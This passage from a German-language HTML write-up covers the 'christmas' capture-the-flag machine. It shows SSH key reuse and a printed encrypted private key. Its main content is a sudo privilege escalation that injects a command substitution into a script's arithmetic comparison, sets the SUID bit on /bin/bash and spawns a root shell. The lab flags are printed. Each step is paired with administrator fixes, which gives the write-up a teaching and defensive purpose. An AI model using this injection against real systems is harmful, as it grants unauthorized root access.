+╰─$ <span class="command">cp .ssh/id_rsa.pub authorized_keys</span></div> <span class="comment">(Fehler: Sollte ins .ssh Verzeichnis kopiert werden: cp .ssh/id_rsa.pub .ssh/authorized_keys)</span>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi id_rsas</span></div> <span class="comment">(Privaten Schlüssel vom Ziel kopieren)</span>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 id_rsas</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh mr-jack@christmas.hmv -i id_rsas</span></div> <span class="comment">(Name id_rsas statt idrssa wie im Text)</span>
+                     <pre>
+<span class="password">Enter passphrase for key 'id_rsas':</span> <span class="comment">(Passphrase wird benötigt!)</span>
+[...]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal"> <span class="comment"># Beispiel eines verschlüsselten Schlüssels (aus dem Text)</span>
+                      <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">cat .ssh/id_rsa</span></div>
+                     <pre><span class="password">
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAeTEYgN+
+[...]
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                  </div>
+              </div>
+
+              <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Skripts `/opt/GiftPursuit`, das `mr-jack` mit `sudo` ausführen darf, wird angezeigt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Das Bash-Skript erwartet eine Zahl als Argument (`$1`). Es generiert eine zufällige 40-stellige Zahl (`NUMBER`). Dann vergleicht es die generierte Zahl mit der übergebenen Zahl (`[[ "${NUMBER}" -eq "${1}" ]]`). Wenn sie übereinstimmen, wird `/bin/bash` für alle (`o`) das SUID-Bit (`+s`) hinzugefügt. Andernfalls gibt es eine Fehlermeldung aus. Das Problem ist der Vergleich `[[ "${NUMBER}" -eq "${1}" ]]`. `-eq` ist für arithmetische Vergleiche gedacht. Wenn `$1` keine reine Zahl ist, sondern z.B. Shell-Syntax enthält, kann dies zu unerwartetem Verhalten oder Command Injection führen, bevor der `-eq`-Vergleich stattfindet.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die Bash Command Substitution auszunutzen. Geben Sie als Argument einen String an, der eine Zahl enthält, gefolgt von einer Command Substitution, z.B. `/opt/GiftPursuit '1[$(beliebiger_befehl)]'`. Da der Vergleich mit `-eq` erfolgt, wird die Bash versuchen, `$(beliebiger_befehl)` auszuführen, bevor der arithmetische Vergleich durchgeführt wird. Nutzen Sie dies, um `chmod +s /bin/bash` auszuführen.
+              <br><strong>Empfehlung (Admin):</strong> Schreiben Sie das Skript sicherer. Validieren Sie die Eingabe `$1` explizit, um sicherzustellen, dass es sich nur um eine Zahl handelt (z.B. mit `[[ "$1" =~ ^[0-9]+$ ]]`). Verwenden Sie keine unsicheren Vergleiche. Überdenken Sie die Logik des Skripts und die Notwendigkeit, SUID-Bits zu setzen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for mr-jack on christmas:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User mr-jack may run the following commands on christmas:
+    <span class="password">(ALL : ALL) NPASSWD: /opt/GiftPursuit</span></pre>
+                     <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">cat /opt/GiftPursuit</span></div>
+                     <pre>
+<span class="comment">#!/bin/bash</span>
+
+if [[ "$#" -eq 0 ]] ; then
+  echo "🎄🎄🎄🎄🎄🎄🎄🎄🎄"
+  echo -e "\nUsage: $0 number\n"
+  echo "🎄🎄🎄🎄🎄🎄🎄🎄🎄"
+  exit 1
+fi
+
+NUMBER=$(openssl rand -hex 45 |tr -dc "0-9" |head -c 40)
+
+if [[ "${NUMBER}" -eq "${1}" ]] ; then
+  echo "Here's your Christmas gift !"
+  <span class="password">chmod o+s /bin/bash</span>
+else
+  echo "No ! If you want a gift, try hard !"
+  exit 1
+fi</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root Exploit)</h2>
+
+             <p class="analysis"><strong>Analyse:</strong> Es werden verschiedene Versuche unternommen, das `/opt/GiftPursuit`-Skript auszunutzen. Zuerst wird ein Testskript `benhack` erstellt, um das Verhalten zu verstehen. Dann wird versucht, durch Command Injection im Argument für `/opt/GiftPursuit` Befehle auszuführen (`touch test`, `cat /root/root.txt`, `chmod +s /bin/bash`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Versuche mit `touch` und `cat` scheitern bzw. führen zu Fehlern, weil die Ausgabe (`root.txt`-Inhalt) keine gültige Zahl für den `-eq`-Vergleich ist. Der entscheidende Versuch ist `<span class="command">sudo /opt/GiftPursuit 'x[$(chmod +s /bin/bash)]'</span>`. Obwohl das Skript "No ! If you want a gift, try hard !" ausgibt (weil der Vergleich fehlschlägt), wird die Command Substitution `$(chmod +s /bin/bash)` **vor** dem fehlschlagenden Vergleich ausgeführt. Dies setzt erfolgreich das SUID-Bit für `/bin/bash`, wie die nachfolgende `ls`-Ausgabe (`-rwsr-sr-x`) bestätigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem das SUID-Bit auf `/bin/bash` gesetzt wurde, führen Sie `/bin/bash -p` aus. Die Option `-p` bewirkt, dass Bash die effektive UID (die jetzt Root ist, da SUID gesetzt ist) nicht auf die reale UID (mr-jack) zurücksetzt. Dies gibt Ihnen eine Root-Shell.
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Schwachstelle im `/opt/GiftPursuit`-Skript (siehe vorherige Empfehlung). Entfernen Sie das SUID-Bit von `/bin/bash` (`chmod u-s /bin/bash`) und überprüfen Sie andere Binaries auf unerwünschte SUID-Bits.</p>
+            <div class="code-block">
+                <div class="terminal"> <span class="comment"># Test des Skript-Verhaltens (optional)</span>
+                     <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">openssl rand -hex 45 |tr -dc "0-9" |head -c 40</span></div>
+                     <pre>3117903546789073003307876586457330025171%</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nano benhack</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat benhack</span></div>
+                     <pre>
+<span class="comment">#!/bin/bash</span>
+[...]
+NUMBER=10 <span class="comment"># Fester Wert für Test</span>
+[...]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">bash benhack 5+1</span></div>
+                     <pre>No ! If you want a gift, try hard !</pre> <span class="comment">(Bestätigt, dass '5+1' nicht als 10 ausgewertet wird)</span>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal"> <span class="comment"># Exploit-Versuche</span>
+                     <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">sudo /opt/GiftPursuit 'x[$(touch test)]'</span></div>
+                     <pre>No ! If you want a gift, try hard !</pre>
+                     <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">ls test</span></div>
+                     <pre>test</pre> <span class="comment">(touch wurde ausgeführt!)</span>
+                     <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">sudo /opt/GiftPursuit 'x[$(cat /root/root.txt)]'</span></div>
+                     <pre>/opt/GiftPursuit: line 12: <span class="password">93ba7e97218f577271c3867abf31ae8a</span>: value too great for base (error token is "93ba7e97218f577271c3867abf31ae8a")</pre> <span class="comment">(cat wurde ausgeführt, aber Vergleich schlägt fehl)</span>
+                     <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">sudo /opt/GiftPursuit 'x[$(chmod +s /bin/bash)]'</span></div>
+                     <pre>No ! If you want a gift, try hard !</pre> <span class="comment">(chmod wurde trotzdem ausgeführt!)</span>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal"> <span class="comment"># Überprüfung und Ausführung der SUID-Bash</span>
+                      <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">ls -la /bin/bash</span></div>
+                     <pre><span class="password">-rwsr-sr-x</span> 1 root root 1265648 Apr 23  2023 /bin/bash</pre> <span class="comment">(SUID Bit ist gesetzt!)</span>
+                     <div class="prompt">╭─mr-jack@christmas ~
+╰─$ <span class="command">/bin/bash -p</span></div>
+                     <div class="prompt">bash-5.2# <span class="command">id</span></div>
+                     <pre><span class="password">uid=1000(mr-jack) gid=1000(mr-jack) euid=0(root) egid=0(root) groups=0(root),1000(mr-jack)</span></pre> <span class="comment">(Root-Rechte erlangt!)</span>
+                     <div class="prompt">bash-5.2# </div>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> In der Root-Shell (`bash-5.2#`) wird die Root-Flag gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">93ba7e97218f577271c3867abf31ae8a</span>` wird erfolgreich angezeigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Notieren Sie die Root-Flag und führen Sie Aufräumarbeiten durch (SUID von bash entfernen, Logs etc.).
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Schwachstelle in `/opt/GiftPursuit` und entfernen Sie das SUID-Bit von `/bin/bash`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">bash-5.2# <span class="command">cat /root/root.txt</span></div>
+                     <pre><span class="password">93ba7e97218f577271c3867abf31ae8a</span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/mr-jack/user.txt</div>
+                     <div class="flag-value"><span class="password">caf45c355c29186bb9d8ab89f7811bf0</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">93ba7e97218f577271c3867abf31ae8a</span></div>
+                 </div>
+             </div>
+         </section>
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 29. Dezember 2023</p>
+    </footer>
+</body>
+</html>
